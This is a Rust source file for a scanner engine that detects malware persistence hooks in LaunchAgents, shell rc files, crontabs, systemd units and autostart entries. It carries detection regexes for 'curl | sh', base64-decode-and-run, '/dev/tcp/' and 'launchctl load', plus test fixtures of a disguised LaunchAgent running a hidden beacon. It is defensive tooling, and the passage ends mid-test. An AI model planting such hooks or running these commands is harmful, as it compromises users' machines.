//! Persistence detection engine.
//!
//! Every other engine answers "is this *code* malicious?" This one answers a
//! different question: **has something already made itself at home on this
//! machine?** It inspects the small, well-known set of files whose only job is
//! to run something again later, and reports the ones whose payload is
//! suspicious:
//!
//! - `~/Library/LaunchAgents/*.plist` and `~/Library/LaunchDaemons/*.plist`
//!   (the primary macOS per-user persistence mechanism),
//! - shell startup files (`.zshrc`, `.bashrc`, `.bash_profile`, `.profile`,
//!   `.zlogin`, …),
//! - `crontab` files and `cron.d`/`cron.{hourly,daily,weekly,monthly}` drops,
//! - systemd user units under `~/.config/systemd/user/`.
//!
//! The engine is pure with respect to the filesystem like every other engine:
//! it never opens a file, it only reads the [`crate::engine::FileUnit`]s the
//! loader already collected. Classification is therefore driven by the unit's
//! `rel_path`, which is exactly what the loader records when it walks a home
//! directory.
//!
//! ## Why the signal is high-value
//!
//! Worms and RATs (the campaigns in `worm_propagation.rs`, BeaverTail, the
//! Shai-Hulud family) all follow the same shape: drop a payload somewhere
//! hidden, then make sure it runs again after a reboot. That second half lands
//! in one of the four file families above, and until now nothing looked at
//! them. A worm whose payload was already cleaned up still leaves the hook
//! behind; this engine finds the hook.
//!
//! ## False-positive control
//!
//! Persistence files are noisy by nature: a completely benign LaunchAgent also
//! lives in `~/Library/LaunchAgents`. So this engine never fires on
//! *existence*, only on the payload:
//!
//! - the executable lives in a temporary or dot-prefixed directory,
//! - the arguments download and execute something,
//! - the arguments decode (base64/hex) and execute something,
//! - the file installs another persistence hook (`launchctl load`),
//! - a cron entry marked `@reboot` runs a payload from a hidden directory.
//!
//! Comments are skipped, and each rule fires at most
//! [`MAX_FINDINGS_PER_RULE`] times per file so one poisoned `.zshrc` cannot
//! flood a report.

use std::sync::OnceLock;

use regex::Regex;

use crate::engine::scan_window;
use crate::engine::{DetectionEngine, FileUnit, ScanContext};
use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};

/// Engine name stamped into every finding and reported in [`EngineStat`].
///
/// [`EngineStat`]: crate::types::EngineStat
const ENGINE: &str = "persistence";

/// Cap on how many times a single rule may fire inside one file.
const MAX_FINDINGS_PER_RULE: usize = 3;

/// Text window (bytes) analyzed per file. The files this engine targets are
/// kilobytes at most, so the cap only bounds a pathological `.zshrc`.
const SCAN_WINDOW_BYTES: usize = 512 * 1024;

/// Per-file, per-rule emission counter.
#[derive(Debug, Default)]
struct RuleBudget {
    counts: Vec<(&'static str, usize)>,
}

impl RuleBudget {
    /// Record an emission; `false` once this rule has hit the cap for the file.
    fn allow(&mut self, rule: &'static str) -> bool {
        let slot = self.counts.iter_mut().find(|(name, _)| *name == rule);
        match slot {
            Some((_, count)) if *count >= MAX_FINDINGS_PER_RULE => false,
            Some((_, count)) => {
                *count += 1;
                true
            }
            None => {
                self.counts.push((rule, 1));
                true
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Regex helpers — compiled once
// ---------------------------------------------------------------------------

struct Patterns {
    /// `<key>Label</key><string>…</string>` in a launchd plist.
    plist_label: Regex,
    /// `<key>Program</key><string>…</string>` (the single-argument form).
    plist_program: Regex,
    /// `<key>ProgramArguments</key><array>…</array>` (the modern form).
    plist_program_arguments: Regex,
    /// One `<string>…</string>` entry.
    plist_string: Regex,
    /// `<key>RunAtLoad</key><true/>`.
    plist_run_at_load: Regex,

    /// Download-then-execute: `curl … | sh`, `bash <(curl …)`, `wget -O- | bash`.
    download_exec: Regex,
    /// Decode-then-execute: `base64 -d | sh`, `eval $(echo … | base64 -d)`.
    decode_exec: Regex,
    /// `launchctl load|bootstrap|submit` (installing another hook).
    launchctl_install: Regex,
    /// `nohup`/`setsid`/`disown` … trailing `&`.
    background_exec: Regex,
    /// A cron schedule field (anything before the command), captured so the
    /// command portion can be inspected on its own.
    cron_schedule: Regex,
    /// `ExecStart` / `ExecStartPre` / `ExecStartPost` in a systemd unit.
    systemd_exec: Regex,
    /// `Exec=` in an XDG `~/.config/autostart/*.desktop` entry.
    desktop_exec: Regex,
    /// A whitespace/comment-only line, or a leading `#` comment.
    skippable_line: Regex,
}

impl Patterns {
    fn build() -> Self {
        // NOTE: every `.expect()` is on a hardcoded literal; a bad literal is a
        // programmer error caught by the unit tests, not a runtime condition.
        Self {
            plist_label: plist_key("Label"),
            plist_program: plist_key("Program"),
            plist_program_arguments: Regex::new(
                r"(?s)<key>ProgramArguments</key>\s*<array>(.*?)</array>",
            )
            .expect("invariant: plist ProgramArguments regex"),
            plist_string: Regex::new(r"(?s)<string>(.*?)</string>")
                .expect("invariant: plist string regex"),
            plist_run_at_load: Regex::new(r"(?s)<key>RunAtLoad</key>\s*<true\s*/?>")
                .expect("invariant: plist RunAtLoad regex"),

            download_exec: Regex::new(
                r#"(?ix)
                (?: \b(?:curl|wget)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:[\w/.-]*/)?(?:ba|da|z|fi|k)?sh\b
                  | \b(?:ba|z|fi|k)?sh\b\s*<\(\s*(?:curl|wget)\b
                  | \bpython[23]?\b\s*<\(\s*(?:curl|wget)\b
                  | \b(?:curl|wget)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?\bpython[23]?\b
                )"#,
            )
            .expect("invariant: download-exec regex"),

            decode_exec: Regex::new(
                r#"(?ix)
                (?: \bb(?:ase)?(?:32|64)\b\s*(?:-d|--decode|-D)\b[^|\n]{0,120}\|\s*(?:[\w/.-]*/)?(?:ba|z|fi|k)?sh\b
                  | \beval\s+[\"']?\$\(\s*(?:echo|printf)\b[^)]{0,200}\|\s*(?:[\w/.-]*/)?b(?:ase)?(?:32|64)\b\s*(?:-d|--decode|-D)\b
                  | \bxxd\s+-r\s+-p\b[^|\n]{0,120}\|\s*(?:[\w/.-]*/)?(?:ba|z|fi|k)?sh\b
                  | \beval\s+[\"']?\$\(\s*(?:echo|printf)\b[^\n]{0,200}\\x[0-9a-f]{2}
                )"#,
            )
            .expect("invariant: decode-exec regex"),

            launchctl_install: Regex::new(
                r"(?i)\blaunchctl\s+(?:load|bootstrap|submit|enable)\b",
            )
            .expect("invariant: launchctl install regex"),

            background_exec: Regex::new(r"(?i)\b(?:nohup|setsid|disown)\b")
                .expect("invariant: background exec regex"),

            cron_schedule: Regex::new(
                r"^\s*(?:@(?:reboot|yearly|annually|monthly|weekly|daily|hourly)\b|(?:\S+\s+){5})(.*)$",
            )
            .expect("invariant: cron schedule regex"),

            systemd_exec: Regex::new(r"(?im)^\s*ExecStart(?:Pre|Post)?\s*=\s*(.+)$")
                .expect("invariant: systemd exec regex"),

            desktop_exec: Regex::new(r"(?im)^\s*Exec\s*=\s*(.+)$")
                .expect("invariant: desktop autostart exec regex"),

            skippable_line: Regex::new(r"^\s*(?:#.*)?$").expect("invariant: blank/comment regex"),
        }
    }
}

/// Build `<key>NAME</key><string>…</string>` with the value captured verbatim.
fn plist_key(name: &str) -> Regex {
    Regex::new(&format!(r"(?s)<key>{name}</key>\s*<string>(.*?)</string>"))
        .expect("invariant: plist key regex")
}

fn patterns() -> &'static Patterns {
    static PATTERNS: OnceLock<Patterns> = OnceLock::new();
    PATTERNS.get_or_init(Patterns::build)
}

// ---------------------------------------------------------------------------
// Target classification
// ---------------------------------------------------------------------------

/// Which family of persistence file a unit belongs to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TargetKind {
    /// A launchd job definition (`~/Library/Launch{Agents,Daemons}/*.plist`).
    LaunchAgent,
    /// A shell startup file (`.zshrc`, `.bashrc`, `.profile`, `config.fish`, …).
    ShellStartup,
    /// A crontab or a `cron.d` style drop-in.
    Crontab,
    /// A systemd user unit (`~/.config/systemd/user/*.service`).
    SystemdUnit,
    /// An XDG desktop autostart entry (`~/.config/autostart/*.desktop`).
    DesktopAutostart,
}

/// Shell startup files whose basename marks them as per-login/per-shell hooks.
const SHELL_STARTUP_NAMES: &[&str] = &[
    ".zshrc",
    ".zprofile",
    ".zlogin",
    ".zshenv",
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".profile",
    ".shrc",
    ".cshrc",
    ".tcshrc",
    ".kshrc",
    ".login",
    ".logout",
    ".envrc",
];

/// Classify a unit by its path, returning `None` when it is not a persistence
/// file. Paths are compared case-insensitively because the loader preserves
/// whatever the filesystem recorded.
fn classify(path: &str) -> Option<TargetKind> {
    let normalized: String = path.replace('\\', "/");
    let lower = normalized.to_ascii_lowercase();
    let basename = lower.rsplit('/').next().unwrap_or(&lower);

    if lower.contains("library/launchagents/") || lower.contains("library/launchdaemons/") {
        if basename.ends_with(".plist") {
            return Some(TargetKind::LaunchAgent);
        }
        return None;
    }

    // NOTE: the containment checks deliberately omit a leading `/`. `rel_path`
    // is relative to whatever root the loader scanned (a home directory, a
    // package), so it may or may not start with one.
    if SHELL_STARTUP_NAMES.contains(&basename)
        || lower.contains("etc/profile.d/")
        || lower.ends_with("fish/config.fish")
    {
        return Some(TargetKind::ShellStartup);
    }

    if basename == "crontab"
        || basename == "cron"
        || lower.contains("var/spool/cron/")
        || lower.contains("etc/cron.")
        || lower.contains("etc/cron.d/")
    {
        return Some(TargetKind::Crontab);
    }

    if lower.contains("systemd/user/") && basename.ends_with(".service") {
        return Some(TargetKind::SystemdUnit);
    }

    if lower.contains("autostart/") && basename.ends_with(".desktop") {
        return Some(TargetKind::DesktopAutostart);
    }

    None
}

/// Dot-directories that are the NORMAL home for user-installed tooling. A
/// launchd job or cron entry whose executable lives under one of these is
/// ordinary (`~/.local/bin/foo`, `~/.cargo/bin/bar`), so hiding there is not by
/// itself evidence of anything. Only a hidden directory *below* or *outside*
/// these is.
const BENIGN_DOT_DIRS: &[&str] = &[
    ".local",
    ".config",
    ".cache",
    ".cargo",
    ".rustup",
    ".nvm",
    ".npm",
    ".nix-profile",
    ".deno",
    ".pyenv",
    ".rbenv",
    ".asdf",
    ".volta",
    ".fnm",
    ".sdkman",
    ".brew",
];

/// `true` when an executable path lives somewhere a legitimately installed
/// launchd job does not: a temporary directory, or inside a dot-prefixed
/// (hidden) directory that is not one of the ordinary tooling roots above.
fn is_suspicious_exec_path(path: &str) -> bool {
    let trimmed = path.trim().trim_matches(|c| c == '"' || c == '\'');
    if trimmed.is_empty() {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    for prefix in [
        "/tmp/",
        "/var/tmp/",
        "/private/tmp/",
        "/private/var/tmp/",
        "/dev/shm/",
        "$tmpdir",
        "${tmpdir}",
        "%tmp%",
    ] {
        if lower.starts_with(prefix) {
            return true;
        }
    }
    // Hidden directory components, skipping the leading empty component (from a
    // rooted path), `.`/`..`, and, crucially, the per-user root itself: on
    // macOS and Linux the third component is the home directory
    // (`/Users/me`, `/home/u`), so dot-directories are only meaningful from the
    // fourth component onwards.
    lower
        .split('/')
        .enumerate()
        .skip(3)
        .filter(|(_, component)| !component.is_empty() && *component != "." && *component != "..")
        .any(|(_, component)| component.starts_with('.') && !BENIGN_DOT_DIRS.contains(&component))
}

/// The first whitespace-delimited token of `line` that looks like a path.
fn first_path_token(line: &str) -> Option<&str> {
    line.split_whitespace()
        .map(|token| token.trim_matches(|c| c == '"' || c == '\''))
        .find(|token| token.starts_with('/') || token.starts_with("./") || token.starts_with("~/"))
}

/// Interpreters that can run a script handed to them inline with `-c` / `-e`.
const INLINE_INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "ksh",
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "node",
    "osascript",
    "php",
];

/// `true` when `executable` is an interpreter invoked with an inline script
/// (`-c` / `-e`) whose body does something overtly malicious.
fn is_inline_script_exec(executable: &str, args: &[String]) -> bool {
    let basename = executable
        .rsplit('/')
        .next()
        .unwrap_or(executable)
        .to_ascii_lowercase();
    if !INLINE_INTERPRETERS.contains(&basename.as_str()) {
        return false;
    }
    let has_inline_flag = args
        .iter()
        .any(|arg| arg == "-c" || arg == "-e" || arg == "-ec" || arg == "-c-");
    if !has_inline_flag {
        return false;
    }
    let body = args.join(" ");
    let patterns = patterns();
    patterns.download_exec.is_match(&body)
        || patterns.decode_exec.is_match(&body)
        || body.contains("/dev/tcp/")
        || is_suspicious_exec_path(first_path_token(&body).unwrap_or(""))
}

// ---------------------------------------------------------------------------
// Engine
// ---------------------------------------------------------------------------

/// Detects persistence hooks that run a suspicious payload. See the module docs
/// for the full rationale and the false-positive controls.
pub struct PersistenceEngine;

impl DetectionEngine for PersistenceEngine {
    fn name(&self) -> &'static str {
        ENGINE
    }

    fn scan(&self, ctx: &ScanContext<'_>) -> Vec<Finding> {
        let patterns = patterns();
        let mut findings = Vec::new();

        for file in ctx.files {
            let Some(kind) = classify(&file.rel_path) else {
                continue;
            };
            if file.is_empty() || !file.looks_textual() {
                continue;
            }
            let text = scan_window(file.text_lossy(), SCAN_WINDOW_BYTES);
            let mut budget = RuleBudget::default();

            match kind {
                TargetKind::LaunchAgent => {
                    scan_launch_agent(file, &text, patterns, &mut budget, &mut findings)
                }
                TargetKind::ShellStartup => {
                    scan_shell_startup(file, &text, patterns, &mut budget, &mut findings)
                }
                TargetKind::Crontab => {
                    scan_crontab(file, &text, patterns, &mut budget, &mut findings)
                }
                TargetKind::SystemdUnit => {
                    scan_systemd_unit(file, &text, patterns, &mut budget, &mut findings)
                }
                TargetKind::DesktopAutostart => {
                    scan_desktop_autostart(file, &text, patterns, &mut budget, &mut findings)
                }
            }
        }

        findings
    }
}

// ---------------------------------------------------------------------------
// launchd plists
// ---------------------------------------------------------------------------

/// One parsed launchd job definition.
#[derive(Debug, Default)]
struct LaunchdJob {
    label: Option<String>,
    program: Option<String>,
    arguments: Vec<String>,
    run_at_load: bool,
}

impl LaunchdJob {
    /// The executable launchd would run: the `Program` key, else argument zero.
    fn executable(&self) -> Option<&str> {
        self.program
            .as_deref()
            .or_else(|| self.arguments.first().map(String::as_str))
    }
}

/// Parse a launchd plist. Returns `None` for a binary plist (`bplist00`) and
/// for any document without a `Program` / `ProgramArguments` key, since those
/// cannot execute anything on their own.
fn parse_launchd_plist(text: &str) -> Option<LaunchdJob> {
    if text.trim_start().starts_with("bplist00") {
        return None;
    }
    let patterns = patterns();
    let mut job = LaunchdJob {
        label: patterns
            .plist_label
            .captures(text)
            .and_then(|caps| caps.get(1))
            .map(|m| m.as_str().to_owned()),
        program: patterns
            .plist_program
            .captures(text)
            .and_then(|caps| caps.get(1))
            .map(|m| m.as_str().to_owned()),
        arguments: Vec::new(),
        run_at_load: patterns.plist_run_at_load.is_match(text),
    };

    if let Some(array) = patterns
        .plist_program_arguments
        .captures(text)
        .and_then(|caps| caps.get(1))
    {
        job.arguments = patterns
            .plist_string
            .captures_iter(array.as_str())
            .filter_map(|caps| caps.get(1))
            .map(|m| m.as_str().to_owned())
            .collect();
    }

    if job.program.is_none() && job.arguments.is_empty() {
        return None;
    }
    Some(job)
}

fn scan_launch_agent(
    file: &FileUnit,
    text: &str,
    patterns: &Patterns,
    budget: &mut RuleBudget,
    findings: &mut Vec<Finding>,
) {
    let Some(job) = parse_launchd_plist(text) else {
        return;
    };
    let Some(executable) = job.executable() else {
        return;
    };
    let joined = match job.program.as_deref() {
        Some(program) => {
            let mut all = Vec::with_capacity(job.arguments.len() + 1);
            all.push(program.to_owned());
            all.extend(job.arguments.iter().cloned());
            all.join(" ")
        }
        None => job.arguments.join(" "),
    };
    let label = job.label.as_deref().unwrap_or("(unnamed)");

    if patterns.download_exec.is_match(&joined) {
        if budget.allow("PERSIST_LAUNCHD_DOWNLOAD_EXEC") {
            findings.push(finding(
                "PERSIST_LAUNCHD_DOWNLOAD_EXEC",
                ThreatCategory::CommandExecution,
                Severity::Critical,
                Confidence::High,
                "Launch agent downloads and executes remote code",
                &format!(
                    "The launchd job {label} runs a download-and-pipe chain (`curl`/`wget` piped into a shell or interpreter) instead of a fixed binary. Every time the job fires it fetches fresh instructions, so the payload can change after review. This is the persistence half of a worm infection."
                ),
                file,
                None,
                &joined,
            ));
        }
        return;
    }

    if patterns.decode_exec.is_match(&joined) {
        if budget.allow("PERSIST_LAUNCHD_DECODE_EXEC") {
            findings.push(finding(
                "PERSIST_LAUNCHD_DECODE_EXEC",
                ThreatCategory::Obfuscation,
                Severity::Critical,
                Confidence::High,
                "Launch agent decodes and executes an embedded payload",
                &format!(
                    "The launchd job {label} pipes an encoded blob (base32/base64/hex) into a shell. Encoding the payload hides it from signature scanning while leaving the job itself in plain sight in LaunchAgents."
                ),
                file,
                None,
                &joined,
            ));
        }
        return;
    }

    if is_inline_script_exec(executable, &job.arguments) {
        if budget.allow("PERSIST_LAUNCHD_INLINE_SCRIPT") {
            findings.push(finding(
                "PERSIST_LAUNCHD_INLINE_SCRIPT",
                ThreatCategory::CommandExecution,
                Severity::High,
                Confidence::Medium,
                "Launch agent runs an inline script with a suspicious body",
                &format!(
                    "The launchd job {label} runs {executable} with an inline script (`-c`/`-e`) whose body downloads, decodes, or reads from a hidden or temporary directory. Benign agents usually run a fixed binary inside an app bundle."
                ),
                file,
                None,
                &joined,
            ));
        }
        return;
    }

    if is_suspicious_exec_path(executable) {
        let (severity, rule) = if job.run_at_load {
            (Severity::Critical, "PERSIST_LAUNCHD_TEMP_EXEC_RUNATLOAD")
        } else {
            (Severity::High, "PERSIST_LAUNCHD_TEMP_EXEC")
        };
        if budget.allow(rule) {
            findings.push(finding(
                rule,
                ThreatCategory::FilesystemAbuse,
                severity,
                Confidence::Medium,
                "Launch agent runs a binary from a temporary or hidden directory",
                &format!(
                    "The launchd job {label} executes {executable}, which lives in a temporary or dot-prefixed directory. Installed software keeps its launchd jobs inside an application bundle; a payload parked in /tmp or a hidden folder is how a worm survives a reboot and a cleanup pass."
                ),
                file,
                None,
                executable,
            ));
        }
    }
}

// ---------------------------------------------------------------------------
// Shell startup files
// ---------------------------------------------------------------------------

fn scan_shell_startup(
    file: &FileUnit,
    text: &str,
    patterns: &Patterns,
    budget: &mut RuleBudget,
    findings: &mut Vec<Finding>,
) {
    for (index, line) in text.lines().enumerate() {
        let line_number = index + 1;
        if patterns.skippable_line.is_match(line) {
            continue;
        }
        let trimmed = line.trim();
        // A trailing backslash continues the command on the next line, so the
        // line is only a fragment; the download/decode regexes still match the
        // head of the chain, which is enough to flag it.
        let snippet = trimmed.trim_end_matches('\\').trim();

        if patterns.download_exec.is_match(snippet) && budget.allow("PERSIST_SHELLRC_DOWNLOAD_EXEC")
        {
            findings.push(finding(
                "PERSIST_SHELLRC_DOWNLOAD_EXEC",
                ThreatCategory::CommandExecution,
                Severity::Critical,
                Confidence::High,
                "Shell startup file downloads and executes remote code",
                "This startup file pipes a download (`curl`/`wget`) straight into a shell. Every new terminal, and in some setups every login, re-runs whatever the remote server currently serves: a self-updating foothold rather than a one-off infection.",
                file,
                Some(line_number),
                snippet,
            ));
        } else if patterns.decode_exec.is_match(snippet)
            && budget.allow("PERSIST_SHELLRC_DECODE_EXEC")
        {
            findings.push(finding(
                "PERSIST_SHELLRC_DECODE_EXEC",
                ThreatCategory::Obfuscation,
                Severity::High,
                Confidence::High,
                "Shell startup file decodes and executes an embedded payload",
                "This startup file decodes an encoded blob (base32/base64/hex) and feeds the result to a shell or `eval`. The plain-text file therefore shows no readable payload, only the decoder: the encoding exists purely to hide what runs on every shell start.",
                file,
                Some(line_number),
                snippet,
            ));
        } else if patterns.launchctl_install.is_match(snippet)
            && budget.allow("PERSIST_SHELLRC_LAUNCHCTL_LOAD")
        {
            findings.push(finding(
                "PERSIST_SHELLRC_LAUNCHCTL_LOAD",
                ThreatCategory::FilesystemAbuse,
                Severity::High,
                Confidence::Medium,
                "Shell startup file installs a launch agent",
                "This startup file calls `launchctl load`/`bootstrap`, so opening a terminal (re)installs a background job. Worms use it to reinstall their launch agent after it has been removed, which is why the hook keeps coming back.",
                file,
                Some(line_number),
                snippet,
            ));
        } else if patterns.background_exec.is_match(snippet)
            && snippet.trim_end().ends_with('&')
            && first_path_token(snippet).is_some_and(is_suspicious_exec_path)
            && budget.allow("PERSIST_SHELLRC_BACKGROUND_HIDDEN")
        {
            findings.push(finding(
                "PERSIST_SHELLRC_BACKGROUND_HIDDEN",
                ThreatCategory::Other,
                Severity::Medium,
                Confidence::Low,
                "Shell startup file backgrounds a detached process from a hidden path",
                &format!(
                    "This startup file detaches a process with `nohup`/`setsid` and a trailing `&`, running it from a temporary or dot-prefixed directory. Plenty of developer tooling does this legitimately, so treat it as a lead: check what {} actually is before removing the line.",
                    first_path_token(snippet).unwrap_or("the command")
                ),
                file,
                Some(line_number),
                snippet,
            ));
        }
    }
}

// ---------------------------------------------------------------------------
// crontab / cron.d
// ---------------------------------------------------------------------------

fn scan_crontab(
    file: &FileUnit,
    text: &str,
    patterns: &Patterns,
    budget: &mut RuleBudget,
    findings: &mut Vec<Finding>,
) {
    for (index, line) in text.lines().enumerate() {
        let line_number = index + 1;
        if patterns.skippable_line.is_match(line) {
            continue;
        }
        let trimmed = line.trim();
        // `KEY=value` assignments (SHELL=, PATH=, MAILTO=) are environment
        // settings, not scheduled commands.
        if !trimmed.contains(char::is_whitespace) {
            continue;
        }
        let Some(command) = patterns
            .cron_schedule
            .captures(trimmed)
            .and_then(|caps| caps.get(1))
            .map(|m| m.as_str().trim())
        else {
            continue;
        };
        if command.is_empty() {
            continue;
        }
        let reboot = trimmed
            .trim_start()
            .to_ascii_lowercase()
            .starts_with("@reboot");

        if patterns.download_exec.is_match(command) && budget.allow("PERSIST_CRON_DOWNLOAD_EXEC") {
            findings.push(finding(
                "PERSIST_CRON_DOWNLOAD_EXEC",
                ThreatCategory::CommandExecution,
                Severity::Critical,
                Confidence::High,
                "Cron job downloads and executes remote code",
                "This cron entry pipes a download into a shell, so the schedule re-fetches and re-runs remote code. Because cron survives reboots on its own, this is a complete persistence loop with no user interaction.",
                file,
                Some(line_number),
                command,
            ));
        } else if patterns.decode_exec.is_match(command) && budget.allow("PERSIST_CRON_DECODE_EXEC")
        {
            findings.push(finding(
                "PERSIST_CRON_DECODE_EXEC",
                ThreatCategory::Obfuscation,
                Severity::High,
                Confidence::High,
                "Cron job decodes and executes an embedded payload",
                "This cron entry decodes an encoded blob and runs the result. The crontab stays readable while the payload it executes does not, and the schedule re-runs it indefinitely.",
                file,
                Some(line_number),
                command,
            ));
        } else if (reboot || is_frequent_schedule(trimmed))
            && first_path_token(command).is_some_and(is_suspicious_exec_path)
            && budget.allow("PERSIST_CRON_HIDDEN_EXEC")
        {
            findings.push(finding(
                "PERSIST_CRON_HIDDEN_EXEC",
                ThreatCategory::FilesystemAbuse,
                Severity::High,
                Confidence::Medium,
                "Cron job runs a payload from a hidden or temporary directory",
                "This cron entry fires on a reboot or on a short interval and runs something out of a temporary or dot-prefixed directory. Scheduled jobs normally run installed binaries from /usr/bin or /usr/local/bin; a hidden payload on a tight schedule is a beacon.",
                file,
                Some(line_number),
                command,
            ));
        }
    }
}

/// `true` for a schedule that repeats at least hourly (`* * * * *`,
/// `*/5 * * * *`, …), the cadence a beacon uses.
fn is_frequent_schedule(line: &str) -> bool {
    let mut fields = line.split_whitespace().take(5);
    let Some(minute) = fields.next() else {
        return false;
    };
    // `*/N` with N <= 59, or a bare `*`, in the minute column.
    if let Some(step) = minute.strip_prefix("*/") {
        return step.parse::<u32>().is_ok_and(|n| n <= 59);
    }
    minute == "*"
}

// ---------------------------------------------------------------------------
// systemd user units
// ---------------------------------------------------------------------------

fn scan_systemd_unit(
    file: &FileUnit,
    text: &str,
    patterns: &Patterns,
    budget: &mut RuleBudget,
    findings: &mut Vec<Finding>,
) {
    for (index, line) in text.lines().enumerate() {
        let line_number = index + 1;
        if patterns.skippable_line.is_match(line) {
            continue;
        }
        let Some(command) = patterns
            .systemd_exec
            .captures(line)
            .and_then(|caps| caps.get(1))
            .map(|m| m.as_str().trim())
        else {
            continue;
        };
        // systemd lets a unit start with `-` (ignore failure) and accepts
        // `@`/`%` specifiers; strip them before looking at the path.
        let cleaned = command.trim_start_matches(&['-', '@', '!', '+'][..]).trim();

        if patterns.download_exec.is_match(cleaned) && budget.allow("PERSIST_SYSTEMD_DOWNLOAD_EXEC")
        {
            findings.push(finding(
                "PERSIST_SYSTEMD_DOWNLOAD_EXEC",
                ThreatCategory::CommandExecution,
                Severity::Critical,
                Confidence::High,
                "systemd user unit downloads and executes remote code",
                "This unit's ExecStart pipes a download into a shell, so systemd re-fetches remote code on every start and restart.",
                file,
                Some(line_number),
                cleaned,
            ));
        } else if patterns.decode_exec.is_match(cleaned)
            && budget.allow("PERSIST_SYSTEMD_DECODE_EXEC")
        {
            findings.push(finding(
                "PERSIST_SYSTEMD_DECODE_EXEC",
                ThreatCategory::Obfuscation,
                Severity::Critical,
                Confidence::High,
                "systemd user unit decodes and executes an embedded payload",
                "This unit's ExecStart decodes an encoded blob and executes it via a shell.",
                file,
                Some(line_number),
                cleaned,
            ));
        } else if first_path_token(cleaned).is_some_and(is_suspicious_exec_path)
            && budget.allow("PERSIST_SYSTEMD_HIDDEN_EXEC")
        {
            findings.push(finding(
                "PERSIST_SYSTEMD_HIDDEN_EXEC",
                ThreatCategory::FilesystemAbuse,
                Severity::High,
                Confidence::Medium,
                "systemd user unit runs a payload from a hidden or temporary directory",
                "This unit's ExecStart points into a temporary or dot-prefixed directory. Package-managed units run binaries from /usr/bin or /usr/lib; a hidden path here is the Linux equivalent of a suspicious LaunchAgent.",
                file,
                Some(line_number),
                cleaned,
            ));
        }
    }
}

// ---------------------------------------------------------------------------
// XDG desktop autostart entries (`~/.config/autostart/*.desktop`)
// ---------------------------------------------------------------------------

fn scan_desktop_autostart(
    file: &FileUnit,
    text: &str,
    patterns: &Patterns,
    budget: &mut RuleBudget,
    findings: &mut Vec<Finding>,
) {
    for (index, line) in text.lines().enumerate() {
        let line_number = index + 1;
        if patterns.skippable_line.is_match(line) {
            continue;
        }
        let Some(command) = patterns
            .desktop_exec
            .captures(line)
            .and_then(|caps| caps.get(1))
            .map(|m| m.as_str().trim())
        else {
            continue;
        };

        if patterns.download_exec.is_match(command)
            && budget.allow("PERSIST_AUTOSTART_DOWNLOAD_EXEC")
        {
            findings.push(finding(
                "PERSIST_AUTOSTART_DOWNLOAD_EXEC",
                ThreatCategory::CommandExecution,
                Severity::Critical,
                Confidence::High,
                "Desktop autostart entry downloads and executes remote code",
                "This XDG autostart `.desktop` file pipes a remote download into a shell at every desktop login.",
                file,
                Some(line_number),
                command,
            ));
        } else if patterns.decode_exec.is_match(command)
            && budget.allow("PERSIST_AUTOSTART_DECODE_EXEC")
        {
            findings.push(finding(
                "PERSIST_AUTOSTART_DECODE_EXEC",
                ThreatCategory::Obfuscation,
                Severity::Critical,
                Confidence::High,
                "Desktop autostart entry decodes and executes an embedded payload",
                "This XDG autostart `.desktop` file decodes an encoded blob and executes it at login.",
                file,
                Some(line_number),
                command,
            ));
        } else if first_path_token(command).is_some_and(is_suspicious_exec_path)
            && budget.allow("PERSIST_AUTOSTART_HIDDEN_EXEC")
        {
            findings.push(finding(
                "PERSIST_AUTOSTART_HIDDEN_EXEC",
                ThreatCategory::FilesystemAbuse,
                Severity::High,
                Confidence::Medium,
                "Desktop autostart entry runs a payload from a hidden or temporary directory",
                "This XDG autostart `.desktop` file executes a binary parked in `/tmp` or a hidden dot-directory on login.",
                file,
                Some(line_number),
                command,
            ));
        }
    }
}

// ---------------------------------------------------------------------------
// Finding construction
// ---------------------------------------------------------------------------

/// Collapse whitespace so a multi-line payload becomes one reportable snippet.
fn sanitize(evidence: &str) -> String {
    evidence.split_whitespace().collect::<Vec<_>>().join(" ")
}

#[allow(clippy::too_many_arguments)]
fn finding(
    rule: &'static str,
    category: ThreatCategory,
    severity: Severity,
    confidence: Confidence,
    title: &str,
    description: &str,
    file: &FileUnit,
    line: Option<usize>,
    evidence: &str,
) -> Finding {
    let location = match line {
        Some(line) => FileLocation::at_line(file.rel_path.as_str(), line),
        None => FileLocation::file(file.rel_path.as_str()),
    };
    Finding::new(ENGINE, category, severity, confidence, title, description)
        .with_rule_id(rule)
        .with_location(location)
        .with_evidence(sanitize(evidence), 200)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::FileKind;

    fn unit(path: &str, data: &str) -> FileUnit {
        FileUnit {
            rel_path: path.to_owned(),
            data: data.as_bytes().to_vec(),
            kind: FileKind::Text,
            sha256: String::new(),
        }
    }

    fn scan(path: &str, data: &str) -> Vec<Finding> {
        let files = vec![unit(path, data)];
        let config = crate::config::ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".to_owned(),
            files: &files,
            package_json: None,
            config: &config,
        };
        PersistenceEngine.scan(&ctx)
    }

    fn shell_rc(payload: &str) -> String {
        format!("export PATH=\"$HOME/bin:$PATH\"\nalias ll='ls -la'\n{payload}\n")
    }

    // ── TRUE POSITIVES ────────────────────────────────────────────────────

    #[test]
    fn launch_agent_running_from_tmp_is_flagged() {
        let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.updater.helper</string>
  <key>ProgramArguments</key>
  <array><string>/tmp/.hidden/beacon</string><string>--daemon</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>"#;
        let findings = scan("Library/LaunchAgents/com.apple.updater.helper.plist", plist);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_LAUNCHD_TEMP_EXEC_RUNATLOAD")),
            "a RunAtLoad agent running out of /tmp/.hidden must be critical: {findings:?}"
        );
    }

    #[test]
    fn launch_agent_downloading_code_is_critical() {
        let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>Label</key><string>com.example.sync</string>
  <key>ProgramArguments</key>
  <array>
